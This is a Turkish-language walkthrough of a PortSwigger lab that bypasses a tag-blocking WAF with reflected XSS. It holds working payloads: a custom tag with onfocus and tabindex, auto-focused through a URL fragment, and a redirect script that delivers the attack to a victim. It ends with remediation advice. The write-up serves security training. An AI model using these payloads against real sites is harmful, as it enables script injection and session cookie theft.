# Reflected XSS into HTML context with all tags blocked except custom ones

## Konu Açıklaması (Özel HTML Etiketleri / Custom Tags & Otomatik Odaklanma)

Modern web uygulamalarında WAF (Web Application Firewall) sistemleri veya girdi doğrulama filtreleri, bilinen tüm standart HTML etiketlerini (`<script>`, `<img>`, `<svg>`, `<body>`, `<iframe>`, `<a>` vb.) bir kara liste (denylist) ile engelleyebilir.

Ancak HTML ayrıştırıcıları (HTML parsers) standart dışı veya tanımlanmamış etiketlerle karşılaştığında hata vermez; bunları geçerli bir DOM düğümü (`HTMLUnknownElement`) olarak DOM ağacına ekler. Eğer WAF kural seti yalnızca bilinen HTML etiketlerini denetleyip özel/tanımsız etiketleri (Custom Tags - örn. `<custom-tag>`, `<xss>` vb.) serbest bırakıyorsa, bu durum güvenlik filtresinin tamamen atlatılmasına (bypass) yol açar.

### Otomatik Tetikleme Zorluğu ve Çözümü (Focus Hijacking):
1. **Etkileşimsiz Çalıştırma (Zero-Interaction):** Özel etiketler `onload` veya `onerror` gibi kendiliğinden çalışan standart olay dinleyicilerine sahip değildir.
2. **`tabindex` ve `onfocus` Kombinasyonu:** Normalde odaklanılamayan (non-focusable) bir özel etikete `tabindex="1"` özniteliği verildiğinde, bu öğe tarayıcı tarafından klavye ve odaklanma etkileşimlerine açılır.
3. **URL Fragment (`#hash`) ile Otomatik Tetikleme:** Sayfa yüklenirken URL sonuna `#etiket_id` fragment'ı eklendiğinde (`https://target/?search=<custom-tag id="x" tabindex="1" onfocus=...>#x`), tarayıcı ilgili ID'ye sahip öğeye otomatik olarak odaklanır (**auto-focus**) ve kullanıcı hiçbir yere tıklamadan `onfocus` olay dinleyicisini ateşler.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** Reflected XSS into HTML context with all tags blocked except custom ones
- **Platform:** PortSwigger Web Security Academy
- **Zorluk Seviyesi:** Practitioner
- **Zafiyet Türü:** Reflected Cross-Site Scripting (XSS) / WAF Bypass
- **Kaynak (Source):** Arama parametresi (`?search=...`)
- **Filtre Mekanizması:** Tüm standart HTML etiketlerini engelleyen katı bir WAF (Yalnızca özel etiketlere izin verilir).
- **Hedef:** Özel bir HTML etiketi (custom tag) enjekte ederek kurban etkileşimi olmadan otomatik olarak `document.cookie` değerini `alert()` ile ekrana basmak.

---

### Adım Adım Çözüm (Walkthrough)

#### 1. Standart XSS Vektörlerini Test Etme
Arama kutusuna bilinen standart XSS yükleri denendiğinde:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=alert(1)>
```
WAF'ın bilinen tüm standart HTML etiketlerini yakalayıp `Tag is not allowed` hatası ile `400 Bad Request` yanıtı döndürdüğü görülür.

#### 2. Özel Etiket (Custom Tag) ve Event Handler Enjeksiyonu
Standart dışı, rastgele adlandırılmış özel bir etiket (`<custom-tag>`) tanımlanır. Bu etikete `id`, `tabindex` ve `onfocus` öznitelikleri atanır:
```html
<custom-tag onfocus="alert(document.cookie)" id="x" tabindex="1"></custom-tag>
```

Bu payload URL formatında encode edilerek ve sonuna `#x` fragment'ı eklenerek tarayıcıda doğrudan test edilir:
```text
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%22alert(document.cookie)%22+id%3D%22x%22+tabindex%3D%221%22%3E%3C%2Fcustom-tag%3E#x
```
URL ziyaret edildiğinde tarayıcı `#x` bağlantısını çözümler, sayfadaki `id="x"` öğesine odaklanır ve `alert(document.cookie)` penceresi ekrana gelir.

#### 3. Exploit Server ile Kurban Üzerinde Otomatik Tetikleme
Lab şartı, saldırının kurban üzerinde otomatik çalışmasıdır. Kurban doğrudan `#x` içeren URL'e gitmeyeceği için bu akış **Exploit Server** üzerinden yönlendirme (redirection) ile kurgulanır:

1. Lab arayüzündeki **Go to exploit server** butonuna tıklanır.
2. Exploit Server'ın **Body** alanına aşağıdaki JavaScript yönlendirme kodu yazılır (`YOUR-LAB-ID` kısmını kendi lab adresinizle güncelleyin):
   ```html
   <script>
   location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%22alert(document.cookie)%22+id%3D%22x%22+tabindex%3D%221%22%3E%3C%2Fcustom-tag%3E#x';
   </script>
   ```
3. **Store** butonuna tıklanarak exploit kaydedilir.
4. **Deliver exploit to victim** butonuna basılarak kurbanın exploit sunucusunu ziyaret etmesi sağlanır.
5. Kurban sayfayı açtığı anda tarayıcısı zafiyetli URL'e `#x` fragment'ı ile yönlendirilir, özel etikete otomatik odaklanılır, `alert(document.cookie)` çalışır ve laboratuvar başarıyla tamamlanır.

---

### Payload ve İstismar Mekanizması

```text
[Kurban Exploit Sayfasını Ziyaret Eder]
                 │
                 ▼
<script>location = 'https://TARGET/?search=<custom-tag id="x" tabindex="1" onfocus="alert(...)">#x'</script>
                 │
                 ├─► 1. Tarayıcı hedef siteye yönlenir.
                 ├─► 2. WAF <custom-tag> etiketini tanımaz / kara listede bulamaz -> Geçişe izin verir!
                 ├─► 3. Sunucu girdiyi sayfaya yansıtır (DOM'da <custom-tag id="x" tabindex="1"> oluşur).
                 ├─► 4. URL'deki #x fragment'ı nedeniyle tarayıcı id="x" elemanına otomatik odaklanır.
                 ▼
         💥 onfocus tetiklenir -> alert(document.cookie) çalışır!
```

#### Neden Çalıştı?
* **WAF Kara Liste Kusuru:** WAF yalnızca bilinen HTML etiketlerini filtrelemekte, standart dışı etiketleri güvenli kabul etmektedir.
* **`tabindex="1"` Etkisi:** Varsayılan olarak yalnızca `<a>`, `<input>`, `<button>` gibi form elemanları odaklanabilir (focusable). `tabindex` özniteliği, standart dışı `HTMLUnknownElement` nesnelerini de odaklanabilir hale getirir.
* **URL Hash (`#x`) & Focus Hijacking:** Tarayıcılar URL fragment'ındaki ID ile eşleşen öğeyi görünür alana kaydırıp odaklama girişiminde bulunur. `tabindex` ile birleştiğinde bu durum kullanıcıdan hiçbir tıklama veya tuş vuruşu gerektirmeden `onfocus` olay dinleyicisini anında tetikler.

---

## Korunma Yöntemleri (Remediation)

1. **Bağlama Uygun Çıktı Kodlama (Context-Aware Output Encoding):**
   - Kullanıcı girdileri HTML gövdesine yansıtılırken etiket adı ne olursa olsun `<` ve `>` karakterleri kesinlikle HTML entity formatına çevrilmelidir (`&lt;` ve `&gt;`). Bu sayede ne standart ne de özel etiketler DOM elemanı olarak derlenemez.
2. **Kara Liste (Denylist) Yerine Beyaz Liste (Allowlist) Kullanımı:**
   - Bilinen zararlı etiketleri engellemek yerine, yalnızca beklenen veri tiplerine ve güvenli karakter kümesine izin verilmelidir.
3. **Content Security Policy (CSP):**
   - `Content-Security-Policy: default-src 'self'` kuralı ile satır içi (inline) JavaScript olay dinleyicilerinin (`onfocus`, `onload` vb.) çalışması tamamen engellenmelidir.

